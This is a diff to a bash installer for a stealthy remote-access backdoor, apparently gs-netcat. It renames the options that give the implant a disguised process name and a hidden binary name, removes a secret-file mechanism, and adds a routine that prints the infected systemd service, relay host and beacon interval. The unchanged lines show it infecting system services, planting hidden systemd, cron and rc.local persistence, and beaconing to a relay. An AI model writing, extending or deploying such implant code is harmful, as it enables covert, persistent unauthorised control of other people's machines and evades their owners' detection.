@@ -43,11 +43,11 @@
 #       - Only connect back every 30 minutes and check for a client.
 # GS_INFECT=1
 #       - Try to infect a systemd service before any other persistency
-# GS_HIDDEN_NAME="[kcached]"
-#       - Specify custom hidden name file & process.
-# GS_BIN_HIDDEN_NAME="defunct"
+# GS_NAME="[kcached]"
+#       - Specify custom hidden name file & process. Default is picked at random.
+# GS_BIN="defunct"
 #       - Specify custom name for binary on filesystem
-#       - Set to GS_HIDDEN_NAME if GS_HIDDEN_NAME is specified.
+#       - Set to GS_NAME if GS_NAME is specified.
 # GS_DL=wget
 #       - Command to use for download. =wget or =curl.
 # GS_TG_TOKEN=
@@ -174,14 +174,16 @@ CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "dbus")
 
 [[ -t 1 ]] && {
 	CY="\033[1;33m" # yellow
-	CDY="\033[0;33m" # yellow
 	CG="\033[1;32m" # green
 	CR="\033[1;31m" # red
-	CDR="\033[0;31m" # red
 	CB="\033[1;34m" # blue
-	CC="\033[1;36m" # cyan
-	CDC="\033[0;36m" # cyan
 	CM="\033[1;35m" # magenta
+	CC="\033[1;36m" # cyan
+	CDR="\033[0;31m" # red
+	CDG="\033[0;32m" # green
+	CDY="\033[0;33m" # yellow
+	CDC="\033[0;36m" # cyan
+	CF="\033[2m"    # faint
 	CN="\033[0m"    # none
 	CW="\033[1;37m"
 }
@@ -753,19 +755,18 @@ init_vars()
 
 	# Defaults
 	# Binary file is called gs-dbus or set to same name as Process name if
-	# GS_HIDDEN_NAME is set. Can be overwritten with GS_BIN_HIDDEN_NAME=
-	if [[ -n $GS_BIN_HIDDEN_NAME ]]; then
-		BIN_HIDDEN_NAME="${GS_BIN_HIDDEN_NAME}"
-		BIN_HIDDEN_NAME_RM+=("$GS_BIN_HIDDEN_NAME")
+	# GS_NAME is set. Can be overwritten with GS_BIN=
+	if [[ -n $GS_BIN ]]; then
+		BIN_HIDDEN_NAME="${GS_BIN}"
+		BIN_HIDDEN_NAME_RM+=("$GS_BIN")
 	else
-		BIN_HIDDEN_NAME="${GS_HIDDEN_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
+		BIN_HIDDEN_NAME="${GS_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
 	fi
 	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
 	
-	SEC_NAME="${BIN_HIDDEN_NAME}.dat"
-	if [[ -n $GS_HIDDEN_NAME ]]; then
-		PROC_HIDDEN_NAME="${GS_HIDDEN_NAME}"
-		PROC_HIDDEN_NAME_RX+="|$(echo "$GS_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+	if [[ -n $GS_NAME ]]; then
+		PROC_HIDDEN_NAME="${GS_NAME}"
+		PROC_HIDDEN_NAME_RX+="|$(echo "$GS_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')"
 	else
 		PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
 	fi
@@ -798,8 +799,6 @@ init_vars()
 	[[ -d "${GS_PREFIX}/lib/systemd/system" ]] && SERVICE_DIR="${GS_PREFIX}/lib/systemd/system"
 	WANTS_DIR="${GS_PREFIX}/etc/systemd/system" # always this
 	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
-	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
-	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
 
 	CRONTAB_DIR="${GS_PREFIX}/var/spool/cron/crontabs"
 	[[ ! -d "${CRONTAB_DIR}" ]] && CRONTAB_DIR="${GS_PREFIX}/etc/cron/crontabs"
@@ -892,9 +891,6 @@ init_setup()
 
 	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"
 
-	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
-
-	# RCLOCAL_LINE="$(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
 	RCLOCAL_LINE="'${DSTBIN}' 2>/dev/null"
 
 	# There is no reliable way to check if a process is running:
@@ -1205,12 +1201,14 @@ gs_secret_reload() {
 	bin2config "${DSTBIN}" "${DSTBIN}"
 	[[ -z "$GS_CONFIG_SECRET" ]] && return 255
 
-	WARN "Already installed in '${DSTBIN}' $GS_CONFIG_BEACON"
+	WARN "Already installed."
 
 	GS_SECRET="$GS_CONFIG_SECRET"
 	GS_BEACON="$GS_CONFIG_BEACON"
 	# GS_PORT="$GS_CONFIG_PORT"
 	GS_HOST="$GS_CONFIG_HOST"
+	PROC_HIDDEN_NAME="$GS_CONFIG_PROC_HIDDENNAME"
+	show_install_config
 	HOWTO_CONNECT_OUT
 	exit_code 0
 }
@@ -1296,7 +1294,7 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}" || return 255
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"
 
-	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}" "${SYSTEMD_SEC_FILE:?}"; return; } # did not work... 
+	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}"; return; } # did not work... 
 
 	IS_SYSTEMD=1
 	((IS_INSTALLED+=1))
@@ -1347,7 +1345,8 @@ install_system_systemd()
 	if [[ -n $GS_INFECT ]]; then
 		i=0
 		while [[ -z $IS_INSTALLED ]] && [[ $i -lt ${#INFECT_BIN_NAME_ARR[@]} ]]; do
-			install_systemd_infect "${INFECT_SYSCTL_NAME_ARR[$i]}" "${INFECT_BIN_NAME_ARR[$i]}"
+			INFECTED_BIN_NAME="${INFECT_BIN_NAME_ARR[$i]}"
+			install_systemd_infect "${INFECT_SYSCTL_NAME_ARR[$i]}" "${INFECTED_BIN_NAME}"
 			((i++))
 		done
 	else
@@ -1357,8 +1356,10 @@ install_system_systemd()
 
 	[[ -n "$IS_INSTALLED" ]] && {
 		xrm "${DSTBIN}"
+		unset DSTBIN
 		return 0
 	}
+	unset INFECTED_BIN_NAME
 
 	install_systemd_new
 	[[ -n "$IS_INSTALLED" ]] && return 0
@@ -1698,6 +1699,18 @@ do_webhook()
 	"${arr[@]}"
 }
 
+show_install_config() {
+	local str
+	[[ -n $INFECTED_BIN_NAME ]] && echo -e "Infected: ${CDG}${INFECTED_BIN_NAME}${CN}"
+	[[ -n $DSTBIN ]]            && echo -e "Binary  : ${CDG}${DSTBIN}${CN} ${CF}[GS_BIN= to change]${CN}"
+	[[ -n $GS_HOST ]]           && echo -e "Relay   : ${CDG}${GS_HOST}:${GS_PORT:-443}${CN}"
+	[[ -n $PROC_HIDDEN_NAME ]]  && echo -e "Name    : ${CDG}${PROC_HIDDEN_NAME}${CN} ${CF}[GS_NAME= to change]${CN}"
+
+	str="always connected ${CN}${CF}[GS_BEACON=30 to change]"
+	[[ -n $GS_BEACON ]] && str="every $GS_BEACON minutes"
+	echo -e "Beacon  : ${CDG}${str}${CN}"
+}
+
 webhooks()
 {
 	local arr
@@ -1837,11 +1850,11 @@ gs_start()
 	if [[ -n "$IS_OLD_RUNNING" ]]; then
 		# HERE: OLD is already running.
 		if [[ -n "$IS_SKIPPED" ]]; then
-			# HERE: Already running. Skipped installation (sec.dat has not changed).
+			# HERE: Already running. Skipped installation.
 			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
 			unset IS_NEED_START
 		else
-			# HERE: sec.dat has been updated
+			# HERE: New installation.
 			OK_OUT
 			WARN "Multiple gs-netcats running."
 			echo -e "--> You may want to check: ${CM}ps -elf|grep -E -- '(${PROC_HIDDEN_NAME_RX})'${CN}"
@@ -1913,6 +1926,7 @@ fi
 [[ -n $IS_DSTBIN_CWD ]] && WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."
 
 webhooks
+show_install_config
 
 HOWTO_CONNECT_OUT
 
